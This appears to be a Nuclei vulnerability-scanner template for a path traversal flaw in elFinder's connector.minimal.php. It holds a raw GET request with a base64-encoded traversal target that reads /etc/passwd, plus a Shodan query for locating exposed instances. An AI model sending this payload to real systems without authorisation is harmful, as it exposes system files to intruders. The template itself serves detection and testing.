id: elFinder-path-traversal
info:
  author: ritikchaddha
  description: 'Connector.minimal.php in std42 elFinder through 2.1.12 is affected
    by path traversal. This allows unauthenticated remote attackers to read, write,
    and browse files outside the configured document root. This is due to improper
    handling of absolute file paths.

    '
  metadata:
    shodan-query: title:"elfinder"
    verified: true
  name: elFinder - Path Traversal
  reference:
  - https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html
  severity: high
  tags: lfi,elfinder
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
